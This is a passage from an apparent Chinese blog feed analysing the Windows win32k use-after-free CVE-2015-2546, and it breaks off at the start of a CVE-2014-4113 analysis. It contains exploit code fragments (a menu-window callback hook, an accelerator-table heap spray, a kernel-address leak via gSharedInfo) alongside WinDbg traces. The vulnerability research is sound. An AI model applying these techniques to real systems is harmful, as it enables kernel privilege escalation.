class="line">&#123;</div><div class="line">LPACCELlpAccel<span class="comment">;</span></div><div class="line"><span class="comment">// 处理 1EB 的消息</span></div><div class="line"><span class="keyword">if</span> (uMsg == MN_FINDMENUWINDOWFROMPOINT)</div><div class="line">&#123;</div><div class="line"><span class="keyword">return</span> (LONG)hWnd2<span class="comment">;</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (uMsg == MN_SETTIMERTOOPENHIERARCHY)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (hWnd2 != NULL)</div><div class="line">&#123;</div><div class="line"><span class="comment">// #32768窗口进行销毁,tagPopupMenu被释放</span></div><div class="line">DestroyWindow(hWnd2)<span class="comment">;</span></div><div class="line">&#125;</div><div class="line"><span class="comment">// 返回值为0绕过判断</span></div><div class="line"><span class="keyword">return</span> <span class="number">0</span><span class="comment">;</span></div><div class="line">&#125;</div><div class="line"><span class="comment">// 处理 1E5 的消息,返回 0x10</span></div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (uMsg == MN_SELECTITEM)</div><div class="line">&#123;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>x10<span class="comment">;</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> CallWindowProcA(lpPrevWndFunc, <span class="keyword">hWnd</span>, uMsg, <span class="keyword">wParam</span>, <span class="keyword">lParam</span>)<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当返回一个普通的窗口对象的时候，发现<code>IsWindowBeingDestroyed</code>过不去，这个问题，前辈已经解决，当创建一个”#32768”窗口对象即可。<br><figure class="highlight tcl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">text:<span class="number">95</span>ADEA1F     _IsWindowBeingDestroyed@<span class="number">4</span> <span class="keyword">proc</span><span class="title"> near</span>     ;<span class="title"> CODE</span> XREF:<span class="title"> ShouldComposeOrDecomposeWindow(x,x)+19↑p</span></div><div class="line"><span class="title">.text:95ADEA1F</span>                                             ;<span class="title"> _HungWindowFromGhostWindow(x)+17↑p</span> ...</div><div class="line">.text:95ADEA1F</div><div class="line">.text:95ADEA1F<span class="title">     arg_0</span>           =<span class="title"> dword</span> ptr  8</div><div class="line">.text:95ADEA1F</div><div class="line">.text:95ADEA1F 000<span class="title">                 mov</span> <span class="title">    edi,</span> edi</div><div class="line">.text:95ADEA21 000<span class="title">                 push</span> <span class="title">   ebp</span></div><div class="line"><span class="title">.text:95ADEA22</span> 004<span class="title">                 mov</span> <span class="title">    ebp,</span> esp</div><div class="line">.text:95ADEA24 004<span class="title">                 mov</span> <span class="title">    edx,</span> [ebp+8]</div><div class="line">.text:95ADEA27 004<span class="title">                 push</span> <span class="title">   esi</span></div><div class="line"><span class="title">.text:95ADEA28</span> 008<span class="title">                 push</span> <span class="title">   edx</span>             ;<span class="title"> a1</span></div><div class="line"><span class="title">.text:95ADEA29</span> 00C<span class="title">                 xor</span> <span class="title">    esi,</span> esi</div><div class="line">.text:95ADEA2B 00C<span class="title">                 call</span> <span class="title">   _IsWindowDestroyed@4</span> ;<span class="title"> IsWindowDestroyed(x)</span></div><div class="line"><span class="title">.text:95ADEA30</span> 008<span class="title">                 test</span> <span class="title">   eax,</span> eax</div><div class="line">.text:95ADEA32 008<span class="title">                 jnz</span> <span class="title">    short</span> loc_95ADEA55</div><div class="line">.text:95ADEA34 008<span class="title">                 test</span> <span class="title">   byte</span> ptr [edx+18h], 80h ;<span class="title"> tagWND-&gt;bInDestroy</span></div><div class="line"><span class="title">.text:95ADEA38</span> 008<span class="title">                 jnz</span> <span class="title">    short</span> loc_95ADEA55</div><div class="line">.text:95ADEA3A 008<span class="title">                 mov</span> <span class="title">    eax,</span> 8000h</div><div class="line">.text:95ADEA3F 008<span class="title">                 test</span>    [edx+2Ah],<span class="title"> ax</span></div><div class="line"><span class="title">.text:95ADEA43</span> 008<span class="title">                 jnz</span> <span class="title">    short</span> loc_95ADEA55</div><div class="line">.text:95ADEA45 008<span class="title">                 mov</span> <span class="title">    edx,</span> [edx+8]</div><div class="line">.text:95ADEA48 008<span class="title">                 test</span> <span class="title">   edx,</span> edx</div><div class="line">.text:95ADEA4A 008<span class="title">                 jz</span> <span class="title">     short</span> loc_95ADEA58</div><div class="line">.text:95ADEA4C 008<span class="title">                 test</span> <span class="title">   byte</span> ptr [edx+0D8h], 1</div><div class="line">.text:95ADEA53 008<span class="title">                 jz</span> <span class="title">     short</span> loc_95ADEA58</div><div class="line">.text:95ADEA55</div><div class="line">.text:95ADEA55<span class="title">     loc_95ADEA55:</span>                           ;<span class="title"> CODE</span> XREF:<span class="title"> IsWindowBeingDestroyed(x)+13↑j</span></div><div class="line"><span class="title">.text:95ADEA55</span>                                             ;<span class="title"> IsWindowBeingDestroyed(x)+19↑j</span> ...</div><div class="line">.text:95ADEA55 008<span class="title">                 xor</span> <span class="title">    esi,</span> esi</div><div class="line">.text:95ADEA57 008<span class="title">                 inc</span> <span class="title">    esi</span></div><div class="line"><span class="title">.text:95ADEA58</span></div><div class="line"><span class="title">.text:95ADEA58</span> <span class="title">    loc_95ADEA58:</span>                           ;<span class="title"> CODE</span> XREF:<span class="title"> IsWindowBeingDestroyed(x)+2B↑j</span></div><div class="line"><span class="title">.text:95ADEA58</span>                                             ;<span class="title"> IsWindowBeingDestroyed(x)+34↑j</span></div><div class="line"><span class="title">.text:95ADEA58</span> 008<span class="title">                 mov</span> <span class="title">    eax,</span> esi</div><div class="line">.text:95ADEA5A 008<span class="title">                 pop</span> <span class="title">    esi</span></div><div class="line"><span class="title">.text:95ADEA5B</span> 004<span class="title">                 pop</span> <span class="title">    ebp</span></div><div class="line"><span class="title">.text:95ADEA5C</span> 000<span class="title">                 retn</span>    4</div><div class="line">.text:95ADEA5C<span class="title">     _IsWindowBeingDestroyed@4</span> endp</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在调试器中，获取弹出菜单对象Popupmenu的地址为0xfe78d9a8，然后当执行完<code>xxxSendMessage(cmdHitArea_1, MN_SETTIMERTOOPENHIERARCHY, 0, 0)</code>销毁了窗口对象之后，很显然，该对象被释放，然后PopupMenu作为参数传入xxxMNHideNextHierarchy，会对popupmenu的spwndNextPopup成员进行判断，为空则直接退出，所以，只需要伪造PopupMenu对象，就可以实现对这块内存的控制。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">kd&gt; g</div><div class="line">Breakpoint 0 hit</div><div class="line">win32k!xxxMNMouseMove+0xe6:</div><div class="line">95ab821f 8b9eb0000000    mov     ebx,dword ptr [esi+0B0h]</div><div class="line">kd&gt; r esi</div><div class="line"><span class="attribute">esi</span>=fe8109a8</div><div class="line">kd&gt; dc fe8109a8+B0</div><div class="line">ReadVirtual: fe810a58 <span class="keyword">not</span> properly sign extended</div><div class="line">fe810a58  fe78d9a8 006e0057 00010017 08000018  <span class="built_in">..</span>x.W.n<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</div><div class="line">fe810a68  0013019c 0000000b ff5e42c8 87daca18  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.B^<span class="built_in">..</span><span class="built_in">..</span>.</div><div class="line">fe810a78  fe810a68 60080018 80000700 00000100  h<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>`<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">fe810a88  04c00000 00000000 00000000 fe810b20  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span> <span class="built_in">..</span>.</div><div class="line">fe810a98  fe8069e8 fe800618 00000000 00000000  .i<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">d&gt; !pool fe78d9a8 </div><div class="line">Pool<span class="built_in"> page </span>fe78d9a8 region is Unknown</div><div class="line"> fe78d000 size:   d0 previous size:    0  (Allocated)  Gpff</div><div class="line">[<span class="built_in">..</span><span class="built_in">..</span>.]</div><div class="line"> fe78d628 size:  2e0 previous size:   d0  (Allocated)  Ttfd</div><div class="line"> fe78d908 size:   50 previous size:  2e0  (Allocated)  Ttfd</div><div class="line"> fe78d958 size:   48 previous size:   50  (Allocated)  Gffv</div><div class="line"><span class="number">*fe78d9a0</span> size:   40 previous size:   48  (Free ) *Uspm Process: 88877030</div><div class="line">Pooltag Uspm : USERTAG_POPUPMENU, Binary : win32k!MNAllocPopup</div><div class="line"> fe78d9e0 size:   10 previous size:   40  (Allocated)  Glnk</div><div class="line"> fe78d9f0 size:   70 previous size:   10  (Allocated)  Ghab</div><div class="line">[<span class="built_in">..</span><span class="built_in">..</span>.]</div></pre></td></tr></table></figure></p><h2 id="0x02-漏洞利用及验证"><a href="#0x02-漏洞利用及验证" class="headerlink" title="0x02 漏洞利用及验证"></a>0x02 漏洞利用及验证</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;总结一下CVE-2015-2546的漏洞利用，通过伪造PopupMenu对象，去占用销毁窗口对象留下的内存空洞，从而实现漏洞利用。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;现在，整个逻辑就很清楚了，首先通过加速键表，占用一大段内存空间,每次申请5个ACCEL的大小，一共申请50次，然后释放部分加速键表，造成内存空洞，然后创建的窗口对象便会占用其中一个内存空洞中。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">LPACCELlpAccel = (<span class="name">LPACCEL</span>)LocalAlloc(<span class="name">LPTR</span>, sizeof(<span class="name">ACCEL</span>) * 0x5);// 大小 0x8 * <span class="number">0</span>x5 = <span class="number">0</span>x28 与 tagPOPUPMENU 大小相同</div><div class="line">for (<span class="name">int</span> i = <span class="number">0</span><span class="comment">; i &lt; 50; i++)</span></div><div class="line">&#123;</div><div class="line">hAccel[i] = CreateAcceleratorTable(<span class="name">lpAccel</span>, <span class="number">0</span>x5)<span class="comment">;</span></div><div class="line">index = LOWORD(<span class="name">hAccel</span>[i])<span class="comment">;</span></div><div class="line">Address = <span class="symbol">&amp;gHandleTable</span>[index]<span class="comment">;</span></div><div class="line">pAcceleratorTable[i] = (<span class="name">PUCHAR</span>)Address-&gt;pKernel<span class="comment">;</span></div><div class="line">printf(<span class="string">"[+] Create Accelerator pKernelAddress at : 0x%p\n"</span>, pAcceleratorTable[i])<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">// 释放双数的加速键表,制造空洞</div><div class="line">for (<span class="name">int</span> i = <span class="number">2</span><span class="comment">; i &lt; 50; i = i + 5)</span></div><div class="line">&#123;</div><div class="line">DestroyAcceleratorTable(<span class="name">hAccel</span>[i])<span class="comment">;</span></div><div class="line">printf(<span class="string">"[+] Destroy Accelerator pKernelAddress at : 0x%p\n"</span>, pAcceleratorTable[i])<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将占用的内存地址打印出来，并在windbg中输出tagWnd2的PopupMenu对象地址为<code>fe440168</code>，很显然，新创建的窗口对象占用了之前释放的内存空洞。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">[+] Create Accelerator pKernelAddress at : 0xFFA27058</div><div class="line">[<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>]</div><div class="line">[+] Create Accelerator pKernelAddress at : 0xFE48C290</div><div class="line">[+] Create Accelerator pKernelAddress at : 0xFF49CA70</div><div class="line">[+] Create Accelerator pKernelAddress at : 0xFF52FBE8</div><div class="line">[+] Create Accelerator pKernelAddress at : 0xFF589128</div><div class="line">[+] Create Accelerator pKernelAddress at : 0xFF58B128</div><div class="line">[+] Create Accelerator pKernelAddress at : 0xFF55F120</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFF4AC7F8</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFE486BC8</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFD36D288</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFE440168  &lt;---</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFE6A94E8</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFD392A70</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFF5A10E0</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFD351170</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFF51B960</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFF589128</div><div class="line">[+] hWnd2 Address: 0x00D62B58</div><div class="line">[+] tagWnd2 at pKernel<span class="built_in"> Address </span>: 0xFE812B58</div><div class="line">kd&gt; DC FE812B58+b0</div><div class="line">ReadVirtual: fe812c08 <span class="keyword">not</span> properly sign extended</div><div class="line">fe812c08  fe440168 00000013 0000000a 00000018  h.D<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</div><div class="line">fe812c18  fe80ab70 fe80f1b0 00000000 00000000  p<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</div><div class="line">fe812c28  00000000 00000000 00000000 00000000  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">fe812c38  00000000 00000000 00000000 00000000  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">fe812c48  002c024b 00000000 00000000 00000000  K.,<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;泄露加速表地址可以借助<code>SHAREDINFO</code>结构体的PUSER_HANDLE_ENTRY成员，这是ENTRY可以理解为一张句柄表。而每一个USER_HANDLE_ENTRY第一个成员pKernel则指向内存地址。<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">typedef struct _SHAREDINFO &#123;</div><div class="line">PSERVERINFO psi<span class="comment">;</span></div><div class="line">PUSER_HANDLE_ENTRY aheList<span class="comment">;</span></div><div class="line">ULONG HeEntrySize<span class="comment">;</span></div><div class="line">ULONG_PTR pDispInfo<span class="comment">;</span></div><div class="line">ULONG_PTR ulSharedDelts<span class="comment">;</span></div><div class="line">ULONG_PTR awmControl<span class="comment">;</span></div><div class="line">ULONG_PTR DefWindowMsgs<span class="comment">;</span></div><div class="line">ULONG_PTR DefWindowSpecMsgs<span class="comment">;</span></div><div class="line">&#125; <span class="keyword">SHAREDINFO, </span>*PSHAREDINFO<span class="comment">;</span></div><div class="line">typedef struct _USER_HANDLE_ENTRY &#123;</div><div class="line">void* pKernel<span class="comment">;</span></div><div class="line">union</div><div class="line">&#123;</div><div class="line">PVOID pi<span class="comment">;</span></div><div class="line">PVOID pti<span class="comment">;</span></div><div class="line">PVOID ppi<span class="comment">;</span></div><div class="line">&#125;<span class="comment">;</span></div><div class="line"><span class="keyword">BYTE </span>type<span class="comment">;</span></div><div class="line"><span class="keyword">BYTE </span>flags<span class="comment">;</span></div><div class="line">WORD generation<span class="comment">;</span></div><div class="line">&#125; USER_HANDLE_ENTRY, *PUSER_HANDLE_ENTRY<span class="comment">;</span></div></pre></td></tr></table></figure></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">PSHAREDINFO pSharedInfo = (<span class="name">PSHAREDINFO</span>)GetProcAddress(<span class="name">GetModuleHandleA</span>(<span class="string">"user32.dll"</span>), <span class="string">"gSharedInfo"</span>)<span class="comment">;</span></div><div class="line">printf(<span class="string">"[+] gSharedInfo at : 0x%p\n"</span>, pSharedInfo)<span class="comment">;</span></div><div class="line">PUSER_HANDLE_ENTRY gHandleTable = pSharedInfo-&gt;aheList<span class="comment">;</span></div><div class="line">LPACCELlpAccel = (<span class="name">LPACCEL</span>)LocalAlloc(<span class="name">LPTR</span>, sizeof(<span class="name">ACCEL</span>) * 0x5);// 大小 0x8 * <span class="number">0</span>x5 = <span class="number">0</span>x28 与 tagPOPUPMENU 大小相同</div><div class="line">for (<span class="name">int</span> i = <span class="number">0</span><span class="comment">; i &lt; 50; i++)</span></div><div class="line">&#123;</div><div class="line">hAccel[i] = CreateAcceleratorTable(<span class="name">lpAccel</span>, <span class="number">0</span>x5)<span class="comment">;</span></div><div class="line">index = LOWORD(<span class="name">hAccel</span>[i])<span class="comment">;</span></div><div class="line">Address = <span class="symbol">&amp;gHandleTable</span>[index]<span class="comment">;</span></div><div class="line">pAcceleratorTable[i] = (<span class="name">PUCHAR</span>)Address-&gt;pKernel<span class="comment">;</span></div><div class="line">printf(<span class="string">"[+] Create Accelerator pKernelAddress at : 0x%p\n"</span>, pAcceleratorTable[i])<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很显然，原先的tagWnd对象已经被销毁，由新申请的加速键内存占用。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">kd&gt; dc ebx</div><div class="line">fe440168  001c0253 00000000 00000000 00000005  S<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</div><div class="line">fe440178  00000000 00000000 00000000 00000000  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">fe440188  00000000 00000000 00000080 00000000  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">fe440198  00000000 86111030 46140008 38616c47  <span class="built_in">..</span><span class="built_in">..</span>0<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>FGla8</div><div class="line">fe4401a8  04080934 00000001 80000000 00000000  4<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</div><div class="line">fe4401b8  00008208 00000000 0000907f 00000000  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">fe4401c8  00000000 00000000 00000000 00000001  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">fe4401d8  00000000 00000000 00000000 95a30d56  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>V<span class="built_in">..</span>.</div><div class="line">kd&gt; t</div><div class="line">win32k!xxxMNMouseMove+0x153:</div><div class="line">95ab828c e86e1effff      call    win32k!xxxMNHideNextHierarchy (95aaa0ff)</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>win32k!xxxMNHideNextHierarchy</code>中调用<code>win32k!xxxSendMessage</code>此时传入的对象是伪造的加速键表。剩下的就和CVE-2014-4113差不多的利用方式，区别就是4113的对象是0xFFFFFFFB。<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">kd&gt; </div><div class="line">win<span class="number">32</span>k<span class="title">!xxxMNHideNextHierarchy</span>+<span class="number">0x41</span>:</div><div class="line"><span class="number">95</span>aaa<span class="number">140</span> e<span class="number">837</span>a<span class="number">5</span>f<span class="number">9</span>ff      <span class="keyword">call</span>    win<span class="number">32</span>k<span class="title">!xxxSendMessage</span> (<span class="number">95</span>a<span class="number">4467</span><span class="keyword">c</span>)</div><div class="line">kd&gt; r eax</div><div class="line">eax=<span class="number">00000005</span></div></pre></td></tr></table></figure></p><h2 id="0x03-参考文献"><a href="#0x03-参考文献" class="headerlink" title="0x03 参考文献"></a>0x03 参考文献</h2><p>[1] <a href="https://xiaodaozhi.com/exploit/122.html" target="_blank" rel="external">对 UAF 漏洞 CVE-2015-2546 的分析和利用</a> ： 小刀师傅对于win32k机制的剖析</p><p>[2] <a href="https://www.anquanke.com/post/id/84911" target="_blank" rel="external">https://www.anquanke.com/post/id/84911</a> ： k0shl师傅调试UAF的细节</p><p>[3] <a href="https://xz.aliyun.com/t/6115" target="_blank" rel="external">https://xz.aliyun.com/t/6115</a> ： thunderjie师傅提供的信息泄露的方法,即查看加速键表地址的方法。</p><p>[4] <a href="https://github.com/ThunderJie/CVE/blob/master/CVE-2015-2546/2015-2546.c" target="_blank" rel="external">https://github.com/ThunderJie/CVE/blob/master/CVE-2015-2546/2015-2546.c</a> : ThunderJie 提供的 exp</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言及原因分析&quot;&gt;&lt;a href=&quot;#0x00-前言及原因分析&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言及原因分析&quot;&gt;&lt;/a&gt;0x00 前言及原因分析&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CVE-2015-2546是发生在&lt;code&gt;win32k!xxxMNMouseMove&lt;/code&gt;函数的一个释放后重引用漏洞(UAF),在&lt;code&gt;win32k!xxxMNMouseMove&lt;/code&gt;中调用xxxSendMessage发送&lt;code&gt;MN_SELECTITEM(0x1E5)&lt;/code&gt;和&lt;code&gt;MN_SETTIMERTOOPENHIERARCHY(0x1F0)&lt;/code&gt;消息的时候，执行流可能会回调进入用户侧，当执行流从用户侧返回之后，&lt;code&gt;win32k!xxxMNMouseMove&lt;/code&gt;函数并没有对&lt;code&gt;tagPopupMenu&lt;/code&gt;对象进行校验，就将其传入&lt;code&gt;win32k!xxxMNHideNextHierarchy&lt;/code&gt;对其进行了访问，从而引用UAF。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://findream.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2014-4113内核提权漏洞分析</title>
    <link href="https://findream.github.io/2022/07/26/CVE-2014-4113%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://findream.github.io/2022/07/26/CVE-2014-4113内核提权漏洞分析/</id>
    <published>2022-07-26T06:02:11.000Z</published>
    <updated>2022-10-23T12:41:57.213Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-2014-4113是Win32k下的释放后重引用漏洞(UAF)，该漏洞位于<code>win32k!xxxHandleMenuMessages</code>中，通过调用<code>win32k!xxxMNFindWindowFromPoint</code>获取tagWnd指针，在此期间，执行流通过回调机制，返回用户侧，在用户侧释放目标菜单对象，并返回<code>0xFFFFFFFB</code>。当执行流重新返回内核侧，<br>并没有针对返回值进行校验，直接使用该返回值作为参数传入<code>win32k!xxxSendMessage</code>发送<code>MN_BUTTONDOWN</code>消息，由此造成UAF。</p><a id="more"></a><h2 id="0x01-原因分析"><a href="#0x01-原因分析" class="headerlink" title="0x01 原因分析"></a>0x01 原因分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本文通过crash寻找漏洞触发的原理，实验环境为win7(x86)sp1。运行poc之后。在<code>win32k!xxxSendMessageTimeout+0xb3</code>处crash。<br><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">nt!RtlpBreakWithStatusInstruction:</div><div class="line"><span class="number">83e6</span>d394 cc              int     <span class="number">3</span></div><div class="line">kd&gt; G</div><div class="line">Access violation - code c0000005 (!!! second chance !!!)</div><div class="line">win32k!xxxSendMessageTimeout+<span class="number">0</span>xb3:</div><div class="line"><span class="number">94</span>a54760 <span class="number">3</span>b7e08          cmp     edi,dword ptr [esi+<span class="number">8</span>]</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过栈回溯，可以清晰的看到漏洞如何从用户层到内核的执行流。显然，该漏洞是在<code>win32k!xxxSendMessageTimeout</code>函数内部crash。<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">kd&gt; kn</div><div class="line"> # ChildEBP RetAddr      </div><div class="line"><span class="number">00</span> <span class="number">96</span>cb<span class="number">9</span>b<span class="number">64</span> <span class="number">94</span>a<span class="number">546</span>a<span class="number">4</span>     win<span class="number">32</span>k<span class="title">!xxxSendMessageTimeout</span>+<span class="number">0xb3</span></div><div class="line"><span class="number">01</span> <span class="number">96</span>cb<span class="number">9</span>b<span class="number">8</span><span class="keyword">c</span> <span class="number">94</span>ac<span class="number">8045</span>     win<span class="number">32</span>k<span class="title">!xxxSendMessage</span>+<span class="number">0x28</span></div><div class="line"><span class="number">02</span> <span class="number">96</span>cb<span class="number">9</span>bec <span class="number">94</span>abfa<span class="number">64</span>     win<span class="number">32</span>k<span class="title">!xxxHandleMenuMessages</span>+<span class="number">0x582</span></div><div class="line"><span class="number">03</span> <span class="number">96</span>cb<span class="number">9</span><span class="keyword">c</span><span class="number">38</span> <span class="number">94</span>acf<span 